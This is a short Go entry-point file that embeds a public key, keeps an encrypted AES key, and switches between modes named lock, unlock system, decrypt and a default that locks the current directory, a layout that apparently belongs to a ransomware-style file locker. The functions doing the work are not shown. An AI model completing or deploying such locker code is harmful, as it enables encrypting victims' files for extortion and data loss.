package main

import (
	_ "embed"
	"fmt"
)

// go:embed keys/public.key
var pubKeyVar []byte

var pl = fmt.Println

var (
	Mode            string
	encryptedAESKey []byte
)

func main() {
	SetModeOfOperation()
	switch Mode {
	case "decrypt":
		ModeDecrypt()
	case "lock":
		ModeLockSystem()
	case "unlock system":
		ModeUnlockSystem()
	default:
		ModeLockCurrentDir()
	}
}
